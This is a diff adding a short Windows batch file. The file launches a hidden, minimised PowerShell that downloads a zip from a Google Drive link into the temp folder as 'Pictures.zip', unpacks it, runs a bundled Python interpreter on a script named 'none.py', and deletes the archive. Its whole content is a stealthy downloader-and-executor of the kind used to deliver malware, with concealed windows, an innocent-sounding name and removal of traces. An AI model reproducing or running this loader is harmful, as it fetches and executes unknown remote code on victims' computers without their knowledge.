@@ -1,0 +1,6 @@
+ÿþ&cls
+@echo off
+
+start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://drive.usercontent.google.com/download?id=18mCKVADdTWgkD8PbXkhYo1kywe8Gz6V_&export=download&authuser=0&confirm=t&uuid=045caed6-a361-4557-af92-705b988f1dbf&at=AAINaIKpIMDEBflKG6n7oPdKSNiF:1780985552035', \"$env:TEMP\Pictures.zip\"); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\Pictures.zip\", \"$env:TEMP\Pictures\"); Start-Sleep -Seconds 1; & \"$env:TEMP\Pictures\python.exe\" \"$env:TEMP\Pictures\none.py\"; del \"$env:TEMP\Pictures.zip\""
+
+exit
